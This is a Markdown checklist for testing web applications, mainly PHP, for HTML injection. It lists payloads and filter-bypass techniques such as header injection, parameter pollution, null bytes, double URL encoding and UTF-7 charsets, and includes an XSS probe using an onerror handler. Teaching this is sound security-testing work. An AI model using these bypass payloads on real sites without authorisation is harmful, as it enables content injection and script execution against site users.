# Final HTML Injection Testing Checklist

---
### 1. **Find Unknown GET/POST Parameters**

Identify hidden or undocumented parameters that the backend accepts. Use Burp Intruder or custom wordlists with common parameter names like `user`, `name`, `id`, `q`, etc.

```
?test=<h1>Injected</h1>
```

**Explanation:**
- Applications often have parameters that are not visible in the HTML or JavaScript but are still processed on the server.
- By brute-forcing parameter names, you may find hidden inputs that are not sanitized, which can lead to HTML injection.

---
### 2. **Test All Form Fields (Including Hidden Fields)**

Enter `</h2><p>Injected</p><!--` or `<h1>Injected</h1>` in every form field to check if the value is rendered in the response without sanitization.  

**Explanation:**
- Developers may validate only some inputs and ignore hidden fields.    
- By targeting both visible and hidden form inputs, you can identify where user input directly reflects in the HTML output.

---
### 3. **Test All Relevant HTTP Headers**

Send test payloads in headers:

```
X-Forwarded-For: <h1>Injected</h1>
X-ProxyUser-IP: <p>Injected</p>
Referer: <img src=x onerror=alert(1)>
User-Agent: <h2>Injected</h2>
```

**Explanation:**
- Some web apps log or display headers for debugging or analytics.
- If a header is directly reflected in the HTML without sanitization, it becomes a valid HTML injection vector.

---
### 4. **Array Injection**

Send array-like inputs to bypass regex or type checks.

```
?user[]=test
?user[0]=safe&user[1]=<h1>Injected</h1>
```

**Explanation:**
- PHP automatically converts array-like inputs into arrays.
- If the backend expects a string, regex-based filters may break, and unsafe array elements may be output without validation.

---
### 5. **Parameter Pollution (HPP)**

Send the same parameter multiple times or mix GET/POST:

```
?user=safe&user=<h1>Injected</h1>
curl -X POST "http://site/page.php?user=safe" -d "user=<h1>Injected</h1>"
```

**Explanation:**
- PHP merges GET, POST, and COOKIE parameters using `$_REQUEST`.
- Depending on `request_order`, it may pick the last or first value.
- This can bypass security checks if one value is validated but another value is used for output.

---
### 6. **Cookie Parameter Injection**

Send injection payloads in cookies:

```
Cookie: user=<h1>Injected</h1>
```

**Explanation:**
- In some configurations, cookies in `$_REQUEST` are treated like GET/POST parameters.
- If cookies are not sanitized, HTML injection is possible even without query parameters.

---
### 7. **Unicode and Encoding Bypasses**

Use special Unicode characters or alternate encoding forms:

```
?user=%E2%80%8B<h1>Injected</h1>
?user=＜h1＞Injected＜/h1＞
```

**Explanation:**
- Many filters only look for `<` and `>` in their ASCII form.
- By using Unicode equivalents or invisible characters, you can bypass blacklists.

---
### 8. **Null Byte Injection**

Inject null bytes in input:

```
?user=test%00<h1>Injected</h1>
```

**Explanation:**
- Older PHP versions truncate input at null bytes.
- This can bypass validation logic and allow injecting HTML that was previously stripped.

---
### 9. **Double URL Encoding**

Double-encode payloads to bypass single-pass filters:

```
?user=%253Ch1%253EInjected%253C%2Fh1%253E
```

**Explanation:**
- If the server decodes input multiple times, `%253C` (double-encoded `<`) becomes `<`.
- This bypasses filters applied only in the first decoding pass.

---
### 10. **Character Set Manipulation**

Use alternative character encodings:

```bash
curl -X POST "http://site/page.php" \
     -H "Content-Type: application/x-www-form-urlencoded; charset=utf-7" \
     -d "user=+ADw-h1+AD4-Injected+ADw-/h1+AD4-"
```

**Explanation:**
- UTF-7 and other exotic charsets can make browsers or servers interpret `<` and `>` even if they are encoded differently.

---
### 11. **Multipart Form Data**

Send payloads with multipart encoding:

```bash
curl -X POST "http://site/page.php" \
     -F "user=<h1>Injected</h1>"
```

**Explanation:**
- If backend regex or sanitization is applied only to `application/x-www-form-urlencoded`, using `multipart/form-data` can bypass it.

---
### 12. **Length/Memory Attacks**

Use extremely long inputs to break filters:

```
?user=aaaa...(thousands)...aaaa<h1>Injected</h1>
```

**Explanation:**
- Some regex engines fail or skip validation with overly long inputs.
- This allows malicious HTML to pass through.

---
### 13. **PHP Magic Quotes Legacy (Rare)**

Test old escaping quirks:

```
?user=test\<h1\>Injected\</h1\>
```

**Explanation:**
- On very old PHP setups (pre-5.4), `magic_quotes` may escape characters incorrectly.
- This may allow injection through unexpected input transformations.

---
---